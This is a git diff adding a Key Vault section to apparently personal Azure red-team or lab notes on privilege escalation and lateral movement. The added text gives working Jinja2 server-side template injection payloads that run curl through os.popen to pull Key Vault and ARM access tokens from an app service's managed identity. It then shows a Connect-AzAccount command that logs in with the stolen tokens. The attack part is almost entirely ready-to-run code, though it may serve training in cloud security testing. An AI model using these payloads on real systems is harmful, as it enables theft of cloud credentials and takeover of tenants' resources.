@@ -49,6 +49,7 @@ Privilege Escalation and Lateral Movement
   - [Add user to VM](https://github.com/conma293/Azure/blob/main/killcycle.md#run-a-script)
   - [Get public IP](https://github.com/conma293/Azure/blob/main/killcycle.md#get-public-ip-of-vm)
   - [Connect to VM](
+- [KeyVault]()
 * * *
 # Enumeration 
 TLDR:
@@ -823,3 +824,21 @@ cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
 
 ## Keyvault
 We already [enumerated]() that the managed identity of the 'vaultfrontend' app service (https://vaultfrontend.azurewebsites.net) can access the keyvault 'ResearchKeyVault'.
+
+To be able to access the keyvault, we need to request a keyvault access token:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+```
+
+Request a new ARM access token using the below command:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+```
+
+Now we can connect using Az PowerShell and use both the arm token and keyvault token:
+```
+$token = 'eyJ0..'
+$keyvaulttoken = 'eyJ0..'
+Connect-AzAccount -AccessToken $token -KeyVaultAccessToken $keyvaulttoken -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
+```
+
